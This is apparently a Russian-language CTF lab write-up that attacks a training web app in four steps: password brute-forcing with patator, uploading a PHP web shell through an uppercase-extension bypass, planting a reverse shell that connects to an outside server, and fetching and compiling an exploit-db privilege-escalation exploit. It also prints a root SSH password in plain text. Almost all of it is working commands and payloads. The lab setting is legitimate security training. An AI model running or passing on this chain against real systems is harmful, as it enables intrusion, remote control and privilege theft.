1-ая лабораторная

Адрес сайта в скриптах (spbctf.ppctf.net:3123) следует заменять на адрес с актуальным портом

Пункт 1. Взломать пароль одного из модераторов

$ wget https://raw.githubusercontent.com/duyet/bruteforce-database/master/indo-cities.txt -O pass.txt
$ patator \
    http_fuzz url=http://spbctf.ppctf.net:3123/users/login \
    method=POST \    body='token=_TOKEN_&username=svetochek&password=FILE0&login_submit=Log+In' \
        0=pass.txt \
        before_urls=http://spbctf.ppctf.net:3123/users/login \
        before_egrep='_TOKEN_:name="token" value="([0-9a-z]+)">'\
        -x ignore:egrep='Invlid' \
        follow=1 \
        accept_cookie=1\
        -t 50

Пункт 2. RCE (Remote code execution)

На сайте после авторизации следует зайти в "Администрирование" и "Файлы". Там нужно выбрать и загрузить файл с произвольным именем, расширением .PHP (Заглавными буквами) и содержимым:

<?php
$cmd = $_GET['cmd'];
system($cmd);
?>

После загрузки следует зайти на страницу с этим файлом и добавить параметр "cmd" с указанием какой-нибудь команды для демонстрации exploit'а

Пример:
spbctf.ppctf.net:3123/public/uploads/fileName.PHP?cmd=uname -a

Пункт 3. PHP Reverse Shell

$ ssh root@135.181.38.41
Password: mmthebest
$ nc -lp 1234

(В новом окне)

$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O reverseShellScript.PHP
$ sed -i "s/127.0.0.1/135.181.38.41/g" reverseShellScript.PHP

Файл следует загрузить на сервер, после чего нужно зайти на соответствующую файлу страницу

Пример:
spbctf.ppctf.net:3123/public/uploads/reverseShellScript.PHP

Теперь в окне с SSH соединением появится доступ к серверу.

Пункт 4. LPE (Local Privilege Escalation)

(В окне с SSH)

$ wget https://www.exploit-db.com/raw/37292 -O /var/www/public/uploads/LPE.c
$ gcc /var/www/public/uploads/LPE.c -o /var/www/public/uploads/LPE
$ ./var/www/public/uploads/LPE
$ id
